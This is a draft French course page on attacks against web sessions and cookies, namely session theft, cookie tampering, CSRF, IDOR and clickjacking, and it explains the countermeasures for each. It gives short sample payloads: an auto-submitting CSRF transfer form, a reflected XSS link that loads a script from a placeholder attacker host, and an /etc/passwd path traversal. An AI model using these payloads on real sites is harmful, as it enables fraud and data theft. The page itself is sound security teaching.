+++
title = 'Attaques sur sessions et cookies'
weight = '730'
draft = true
+++
---------

Au chapitre 5, nous avons vu que voler un identifiant de session permet de se faire passer pour l'utilisateur. Voici les principales attaques et leurs contre-mesures.

| Attaque | Principe | Contre-mesures |
|---|---|---|
| **Vol de session** | L'attaquant obtient le cookie : écoute réseau sans HTTPS, XSS, logiciel malveillant (chapitre 6). Aucun mot de passe nécessaire, et la **MFA est contournée**, puisque le cookie est obtenu *après* l'authentification. | HTTPS partout (chapitre 4), `Secure`, `HttpOnly`, expiration courte |
| **Identifiant prévisible** | L'identifiant est devinable (`session=1001`, `1002`...). | Identifiant long et **aléatoire**.|
| **Manipulation de cookie** | Le cookie contient une information de sécurité (`role=etudiant`) que l'utilisateur modifie (`role=admin`) : **escalade de privilèges**. | Garder les rôles **côté serveur** ; sinon **signer** le cookie |

<!-- 
| **Fixation de session** | L'attaquant impose à la victime un identifiant qu'il connaît, puis attend qu'elle se connecte. | **Régénérer l'identifiant** après la connexion |

 -->

{{%notice style="info" title="Lien avec le chapitre 4 : signer pour garantir l'intégrité"%}}
Pour stocker des données côté client sans qu'elles soient modifiées, le serveur les **signe** avec une clé secrète. Toute modification est détectée.

<!-- C'est le principe des **jetons JWT** utilisés par les API (chapitre 5) : un contenu lisible + une signature. Rappel du chapitre 4 : **signer ≠ chiffrer**. Le contenu d'un JWT est simplement encodé en Base64 et lisible par tous ; on n'y met donc jamais d'information confidentielle. -->
{{%/notice%}}

<!-- {{%notice style="info" title="HTTPS et HSTS"%}}
L'en-tête `Strict-Transport-Security` (**HSTS**) oblige le navigateur à toujours utiliser HTTPS pour un site, même si l'utilisateur tape `http://`. Il empêche un attaquant en position d'homme du milieu de forcer une connexion non chiffrée.
{{%/notice%}} -->

## Cross-Site Request Forgery (CSRF / XSRF)

Une attaque **CSRF** amène le navigateur d'une victime **connectée** à envoyer, à son insu, une requête vers le site visé. Comme le navigateur **joint automatiquement le cookie de session**, le site croit que la requête est légitime. L'attaquant ne vole rien : il **fait agir la victime à sa place**.

### Exemple

La victime est connectée à sa banque. L'attaquant l'attire sur sa propre page, qui contient :

```html
<form id="piege" action="https://banque.exemple/virement" method="POST">
  <input type="hidden" name="destinataire" value="compte-attaquant">
  <input type="hidden" name="montant" value="1000">
</form>
<script>document.getElementById("piege").submit();</script>
```

![Attaque CSRF : la victime connectée à sa banque visite une page piégée, qui envoie automatiquement un virement ; le navigateur joint le cookie de session de la banque](/images/07-csrf.png)

Le formulaire est envoyé automatiquement, le navigateur joint le cookie de la banque, et le virement est effectué. Si l'action est possible par une requête `GET`, une simple image suffit :

```html
<img src="https://banque.exemple/virement?destinataire=compte-attaquant&montant=1000">
```

### Contre-mesures

<!-- 1. **Jeton anti-CSRF** : une valeur aléatoire et secrète, liée à la session, est ajoutée à chaque formulaire et vérifiée par le serveur. L'attaquant ne peut pas la connaître (politique de même origine). Les cadriciels l'offrent généralement par défaut. -->
1. **Attribut `SameSite`** sur le cookie de session.
2. **Jamais d'action avec `GET`** : `GET` sert à consulter, `POST` à modifier.
<!-- 4. **Réauthentification** pour les actions critiques (mot de passe actuel, MFA). -->

| | **XSS** | **CSRF** |
|---|---|---|
| D'où vient l'attaque ? | Du code s'exécute **dans le site visé** | La requête vient **d'un autre site** |
| Le site fait trop confiance... | aux **données** de l'utilisateur | au **navigateur** (le cookie suffit) |
| L'attaquant lit la réponse ? | Oui | Non |
| Contre-mesures | Encodage, CSP, `HttpOnly` | Jeton anti-CSRF, `SameSite` |

{{%notice style="tip" title="Exercice"%}}
Identifiez l'attaque : **XSS réfléchi**, **XSS stocké**, **CSRF**, **fixation de session** ou **manipulation de cookie**.

1. Un étudiant modifie le cookie `admin=false` en `admin=true` et accède au panneau d'administration.
2. Un message du forum d'un cours affiche une fenêtre surgissante à chaque personne qui le consulte.
3. Un courriel contient le lien `https://boutique.exemple/recherche?q=<script src=//pirate.exemple/x.js></script>`.
4. En visitant un blogue, l'adresse courriel d'un utilisateur est modifiée à son insu sur un réseau social où il est connecté.
5. Un attaquant envoie le lien `https://site.exemple/login?PHPSESSID=abc123`, puis utilise `abc123` après que la victime s'est connectée.
{{%/notice%}}

<!-- {{% expand "Solution" %}}
1. Manipulation de cookie
2. XSS stocké
3. XSS réfléchi
4. CSRF
5. Fixation de session
{{% /expand %}} -->

## Autres attaques courantes

- **Contrôle d'accès défaillant (IDOR)** : l'application vérifie que l'utilisateur est **connecté**, mais pas qu'il a **le droit** d'accéder à la ressource. Ex. : changer `bulletin?etudiant=2024123` en `2024124` affiche le bulletin d'un autre étudiant. On retrouve la distinction **authentification / autorisation** du chapitre 5 ; la solution est de vérifier les permissions **côté serveur, à chaque requête** (RBAC). C'est le **1er risque** du Top 10 de l'OWASP.
<!-- - **Traversée de répertoires** : `telecharger?fichier=../../etc/passwd` permet de lire des fichiers hors du dossier prévu. -->
- **Téléversement non contrôlé** : une « photo de profil » qui est en réalité un script exécuté par le serveur.
- **Détournement de clic** (*clickjacking*) : le site légitime est affiché dans un cadre invisible, sous un bouton piégé. 